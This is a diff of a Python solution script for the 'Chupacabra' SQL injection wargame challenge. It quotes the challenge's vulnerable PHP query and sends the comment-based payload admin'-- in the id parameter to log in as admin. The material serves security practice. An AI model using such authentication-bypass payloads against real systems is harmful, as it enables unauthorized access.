@@ -1,9 +1,10 @@
 #!/usr/bin/env python3
 import los
+import los_cookies as lc
 
 
 def main():
-    '''
+    """
     Chupacabra 37
 
     $db = sqlite_open("./db/chupacabra.db");
@@ -11,19 +12,20 @@ def main():
     echo "<hr>query : <strong>{$query}</strong><hr><br>";
     $result = sqlite_fetch_array(sqlite_query($db,$query));
     if($result['id'] == "admin") solve("chupacabra");
-    '''
+    """
 
     url = "https://los.rubiya.kr/chall/chupacabra_8568ab6205bea61d634a8cc67484a35c.php"
-    cook = los.check_cookies(url)
+    cook = lc.check_cookies(url)
+    method = 'get'
+    inj_param = 'id'
 
-    param = dict(id="admin'-- ")
+    payload = "admin'-- "
+    p = los.SqlInjection(url, cook, method, inj_param, payload)
 
-    response = los.get_request(url, param, cook)
-
+    response = p.my_request()
     if 'Clear!' in response:
-        print('Chupacabra Clear!')
+        print('\nChupacabra Clear!')
 
 
 if __name__ == '__main__':
     main()
-
